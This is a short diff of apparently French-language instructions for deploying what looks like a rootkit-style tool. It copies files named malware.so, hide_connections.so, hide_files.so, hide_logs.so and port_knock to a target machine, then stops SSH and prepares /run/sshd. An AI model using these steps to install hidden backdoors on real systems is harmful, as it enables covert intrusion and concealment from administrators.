@@ -48,7 +48,10 @@ scp port_knock malware.so hide_connections.so hide_files.so hide_logs.so user@19
 Sur la machine cible, désactivez SSH et préparez l’environnement :
 ```
 sudo systemctl stop ssh
-sudo mkdir -p /usr/sbin/sshd
+sudo mkdir -p /run/sshd
+sudo chmod 755 /run/sshd
+
+
 
 ```
 
